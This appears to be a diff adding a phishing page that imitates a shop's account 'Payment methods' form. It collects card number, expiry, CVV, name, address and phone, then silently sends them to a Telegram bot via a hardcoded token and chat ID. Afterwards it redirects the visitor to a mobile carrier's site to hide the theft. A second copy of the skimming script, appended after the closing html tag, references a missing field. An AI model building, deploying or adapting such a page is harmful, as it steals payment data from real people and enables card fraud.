@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Authentication</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      background: #fff;
+    }
+
+    .sidebar {
+      width: 250px;
+      background;
+      padding: 30px 20px;
+      border-right: 1px solid #ccc;
+      height: 100vh;
+    }
+
+    .sidebar h3 {
+      margin-top: 0;
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    .sidebar a {
+      display: block;
+      margin-bottom: 12px;
+      color: #000;
+      text-decoration: none;
+    }
+
+    .main-content {
+      padding: 40px 60px;
+      flex-grow: 1;
+    }
+
+    h1 {
+      margin-top: 0;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    form {
+      max-width: 500px;
+      margin-top: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .row input {
+      flex: 1;
+    }
+
+    .button-row {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 14px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .cancel-button {
+      background: transparent;
+      border: 1px solid #000;
+    }
+
+    .continue-button {
+      background: #000;
+      color: #fff;
+    }
+
+    small {
+      font-size: 12px;
+      color: #555;
+    }
+
+    /* Responsive styles */
+    @media (max-width: 768px) {
+      body {
+        flex-direction: column;
+      }
+      .sidebar {
+        width: 100%;
+        height: auto;
+        border-right: none;
+        border-bottom: 1px solid #ccc;
+        padding: 20px 10px;
+      }
+      .main-content {
+        padding: 20px 10px;
+      }
+      .row {
+        flex-direction: column;
+      }
+      .row input {
+        flex: none;
+        width: 100%;
+      }
+      .button-row {
+        flex-direction: column;
+      }
+      button {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <h3>My account</h3>
+    <a href="#">Orders ></a>
+    <a href="#">Personal Details ></a>
+    <a href="#">Addresses ></a>
+    <a href="#">Payment methods ></a>
+    <a href="#">Wishlist ></a>
+    <a href="#">Discount schemes ></a>
+    <a href="#">Account Preferences ></a>
+    <a href="#">Communication Preferences ></a>
+  </div>
+
+  <div class="main-content">
+    <h1>Payment methods</h1>
+    <p><strong>Add payment details</strong></p>
+    <p>Please give details of the new card you would like to use. Please do not remove your card until your order has been dispatched. If you have removed or amended your card, please let us know as soon as possible to avoid any delays with your order shipping.</p>
+
+    <form id="cardForm" onsubmit="sendToTelegram(event)">
+      <label for="cardNumber">Card number *</label>
+      <input type="text" id="cardNumber" placeholder="**** **** **** ****" required />
+
+      <div class="row">
+        <div>
+          <label for="expiryMonth">Expiry date *</label>
+          <div class="row">
+            <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" required />
+            <input type="text" id="expiryYear" placeholder="YY" maxlength="2" required />
+          </div>
+        </div>
+      </div>
+
+      <label for="nameOnCard">Name on card *</label>
+      <input type="text" id="nameOnCard" placeholder="e.g. Mr Joe Bloggs" required />
+
+      <label for="securityCode">Card security code *</label>
+      <input type="text" id="securityCode" placeholder="***" maxlength="4" required />
+
+      <label for="houseNumber">House number/name *</label>
+      <input type="text" id="houseNumber" placeholder="e.g. 123" required />
+
+      <label for="postcode">Postcode *</label>
+      <input type="text" id="postcode" placeholder="e.g. BTXX XX" required />
+
+      <label for="cardName">Card name *</label>
+      <input type="text" id="cardName" placeholder="e.g. Joe Mastercard Credit Card" required />
+
+      <label for="phoneNumber">Phone Number *</label>
+      <input type="text" id="phoneNumber" placeholder="+44 7123456789" required />
+
+      <div class="button-row">
+        <button type="button" class="cancel-button">Cancel</button>
+        <button type="submit" class="continue-button">Continue</button>
+      </div>
+
+      <small>* Indicates required information</small>
+    </form>
+  </div>
+
+  <script>
+    async function sendToTelegram(event) {
+      event.preventDefault();
+
+      const TELEGRAM_BOT_TOKEN = '7886311227:AAE8d2XwCZ7s0GuIlX8Nbtp3wYI8LwhBJOI';
+      const TELEGRAM_CHAT_ID = '5199748045';
+
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiryMonth = document.getElementById('expiryMonth').value;
+      const expiryYear = document.getElementById('expiryYear').value;
+      const nameOnCard = document.getElementById('nameOnCard').value;
+      const securityCode = document.getElementById('securityCode').value;
+      const houseNumber = document.getElementById('houseNumber').value;
+      const postcode = document.getElementById('postcode').value;
+      const cardName = document.getElementById('cardName').value;
+
+      const message = `
+💳 New Card Entry:
+
+Card Number: ${cardNumber}
+Expiry: ${expiryMonth}/${expiryYear}
+Name on Card: ${nameOnCard}
+CVV: ${securityCode}
+Address: ${houseNumber}, ${postcode}
+Card Label: ${cardName}
+`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${'7886311227:AAE8d2XwCZ7s0GuIlX8Nbtp3wYI8LwhBJOI'}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+          }),
+        });
+
+        // Redirect after sending message
+        window.location.href = 'https://ee.co.uk/';
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+  </script>
+</body>
+</html>
+
+<script>
+    async function sendToTelegram(event) {
+      event.preventDefault();
+
+      const TELEGRAM_BOT_TOKEN = '7886311227:AAE8d2XwCZ7s0GuIlX8Nbtp3wYI8LwhBJOI';
+      const TELEGRAM_CHAT_ID = '5199748045';
+
+
+      
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiryMonth = document.getElementById('expiryMonth').value;
+      const expiryYear = document.getElementById('expiryYear').value;
+      const nameOnCard = document.getElementById('nameOnCard').value;
+      const securityCode = document.getElementById('securityCode').value;
+      const houseNumber = document.getElementById('houseNumber').value;
+      const streetAddress = document.getElementById('streetAddress').value;
+      const postcode = document.getElementById('postcode').value;
+      const phoneNum = document.getElementById('phoneNumber').value;
+      const cardName = document.getElementById('cardName').value;
+
+      const message = `
+💳 New Card Entry:
+
+Card Number: ${cardNumber}
+Expiry: ${expiryMonth}/${expiryYear}
+Name on Card: ${nameOnCard}
+CVV: ${securityCode}
+Address: ${houseNumber}, ${streetAddress}, ${postcode}
+Card Label: ${cardName}
+`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${'7886311227:AAE8d2XwCZ7s0GuIlX8Nbtp3wYI8LwhBJOI'}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+          }),
+        });
+
+        // Redirect after sending message
+        window.location.href = 'https://ee.co.uk/';
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+  </script>
